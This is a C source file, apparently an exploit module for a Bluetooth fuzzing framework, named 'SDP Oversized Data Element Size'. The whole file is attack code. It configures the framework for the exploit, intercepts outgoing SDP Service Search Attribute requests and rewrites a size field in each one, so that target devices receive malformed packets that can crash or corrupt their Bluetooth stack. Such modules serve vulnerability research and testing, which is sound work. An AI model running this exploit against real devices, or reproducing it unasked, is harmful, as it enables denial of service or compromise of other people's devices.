#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters
static const char *filter_smp_service_search_attribute_req;

// Vars

// Setup
static const char *module_name()
{
    return "SDP Oversized Data Element Size ";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 6000;
    config->bluetooth.disable_role_switch = true; // Ensure we are always the link master
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;

    filter_smp_service_search_attribute_req = packet_register_filter("btsdp.pdu == 0x06");
    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    packet_set_filter(filter_smp_service_search_attribute_req);
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (packet_read_filter(filter_smp_service_search_attribute_req))
    {
        // Data Element Size: uint32 (3)
        wd_log_y("Sending Oversized Data Element Size");
        pkt_buf[22] |= 0b111;
        return 1;
    }
    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}